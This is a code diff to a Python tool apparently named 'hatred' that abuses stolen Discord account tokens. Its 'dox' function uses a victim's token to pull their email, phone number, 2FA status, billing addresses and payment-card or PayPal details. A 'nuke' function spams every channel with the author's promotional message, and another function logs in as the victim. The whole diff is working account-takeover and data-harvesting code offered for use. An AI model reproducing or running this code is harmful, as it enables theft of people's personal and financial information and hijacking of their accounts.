@@ -4,13 +4,10 @@ import requests
 import discord
 import random
 import os
-import re
 
 
-from colorama import Fore, Style, init
+from colorama import Fore, Style
 from selenium import webdriver
-from bs4 import BeautifulSoup
-from datetime import datetime
 from itertools import cycle
 from time import sleep
 
@@ -55,7 +52,8 @@ class login(discord.Client):
             super().run(token, bot=False)
         except BaseException:
             print(f'                                        :::')
-            print(f'                                        INVALID TOKEN </3')
+            print(
+                f'                                        invalid token ; enter to return')
             print(f'                                        :::')
             sleep(3)
             hatred()
@@ -85,6 +83,7 @@ def dox(token):
     headers = {'Authorization': token, 'Content-Type': 'application/json'}
     r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
     cc_digits = {"american express": "3", "visa": "4", "mastercard": "5"}
+    billing_info = []
     try:
         if r.status_code == 200:
             userName = r.json()['username'] + '#' + r.json()['discriminator']
@@ -92,8 +91,7 @@ def dox(token):
             phone = r.json()['phone']
             email = r.json()['email']
             mfa = r.json()['mfa_enabled']
-            billing_info = []
-        print(f'''
+            print(f'''
                                         [ UUID  ]: {userID}
                                         [ USER  ]: {userName}
                                         [ 2FA?  ]: {mfa}
@@ -104,7 +102,7 @@ def dox(token):
         pass
 
     try:
-        for x in requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers,).json():
+        for x in requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json():
             y = x["billing_address"]
             name = y["name"]
             address_1 = y["line_1"]
@@ -152,10 +150,36 @@ def dox(token):
                     f"                                        [ PAYPAL COUNTRY ]: " + country,
                     f"                                        [ DEFAULT PAYM   ]: " + x["default"],
                 }
-
-        print(billing_info.append(data))
     except:
         pass
+
+    billing_info.append(data)
+
+    if len(billing_info) > 0:
+        if len(billing_info) == 1:
+            for x in billing_info:
+                for key, val in x.items():
+                    if not val:
+                        continue
+                    print('{:<23}{}'.format(key, val))
+        else:
+            for i, x in enumerate(billing_info):
+                title = f'PAYMENT #{i + 1} | {x["Payment Type"]}'
+                print(' ' + title)
+                print(' ' + ('=' * len(title)))
+                for j, (key, val) in enumerate(x.items()):
+                    if not val or j == 0:
+                        continue
+                    print('        {:<23}{}'.format(key, val))
+                if i < len(billing_info) - 1:
+                    print('\n')
+        input('')
+        hatred()
+    else:
+        print(f"DEFAULT PAYMENT => N/A")
+        input('')
+        hatred()
+
     input('')
     hatred()
 
@@ -170,7 +194,7 @@ def nuke(token):
     for id in channIds:
         try:
             requests.post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers, data={
-                          "content": "i've been hit with 'hatred' => lust, l-ust on github : https://github.com/l-ust | join us @ https://discord.gg/e4tDdqxgWx"})
+                          "content": "i've been hit with 'hatred' => lust, l-ust on github : https://github.com/l-ust | join us @ https://discord.gg/vmV8ABh3HE | https://www.github.com/l-ust/hatred"})
             print(
                 f'                                        [=>] dm\'ed => {id}')
         except Exception as e:
@@ -372,12 +396,12 @@ def hatred():
                                         [{Fore.RED}2{Fore.RESET}] => ACCOUNT-DOX
                                         [{Fore.RED}3{Fore.RESET}] => ACCOUNT LOG-IN
                                         [{Fore.RED}4{Fore.RESET}] => EXIT
-                                        :::'''.replace('█',f'{Fore.WHITE}█{Fore.RED}'))
+                                        :::'''.replace('█', f'{Fore.WHITE}█{Fore.RED}'))
     decision = str(input(f'                                        [>] => '))
 
     if decision == '1':
         print(f'                                        :::')
-        print(f'                                        TOKEN:')
+        print(f'                                        invalid token ; enter to return:')
         token = str(input(f'                                        [>] => '))
 
         headers = {'Authorization': token, 'Content-Type': 'application/json'}
@@ -393,7 +417,8 @@ def hatred():
                 return
         else:
             print(f'                                        :::')
-            print(f'                                        INVALID TOKEN </3')
+            print(
+                f'                                        invalid token ; enter to return')
             input(f'                                        [>] => ')
             hatred()
 
@@ -416,7 +441,8 @@ def hatred():
             logins(token)
         else:
             print(f'                                        :::')
-            print(f'                                        INVALID TOKEN </3')
+            print(
+                f'                                        invalid token ; enter to return')
             input(f'                                        [>] => ')
             hatred()
 
